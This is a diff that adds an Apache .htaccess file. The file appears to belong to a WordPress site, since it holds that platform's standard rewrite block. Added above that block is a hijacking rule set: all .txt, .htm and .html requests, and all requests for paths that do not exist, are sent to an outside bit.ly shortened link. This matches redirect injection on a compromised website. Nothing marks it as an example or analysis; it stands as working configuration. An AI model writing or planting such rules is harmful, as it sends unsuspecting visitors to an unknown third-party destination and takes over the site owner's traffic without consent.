@@ -1,0 +1,17 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule ^.+\.txt$ https://bit.ly/3otfyNd [L]
+RewriteRule ^.+\.htm$ https://bit.ly/3otfyNd [L]
+RewriteRule ^.+\.html$ https://bit.ly/3otfyNd [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . https://bit.ly/3otfyNd [L]
+</IfModule>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
